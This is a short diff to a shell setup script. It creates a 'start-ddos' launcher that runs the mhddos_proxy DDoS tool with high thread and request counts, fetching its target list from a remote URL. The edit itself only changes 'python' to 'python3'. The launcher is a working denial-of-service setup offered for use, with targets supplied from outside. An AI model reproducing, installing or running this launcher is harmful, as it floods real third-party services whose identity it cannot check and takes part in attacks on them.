@@ -24,7 +24,7 @@ set -xe
 cat > start-ddos <<EOF
 #!/usr/bin/env bash
 cd ~/storage/shared/mhddos_proxy
-exec python runner.py -c https://targets.cyberarmy.com.ua/targets.txt -t 300 --rpc 1000 \$@
+exec python3 runner.py -c https://targets.cyberarmy.com.ua/targets.txt -t 300 --rpc 1000 \$@
 EOF
 chmod +x start-ddos
 
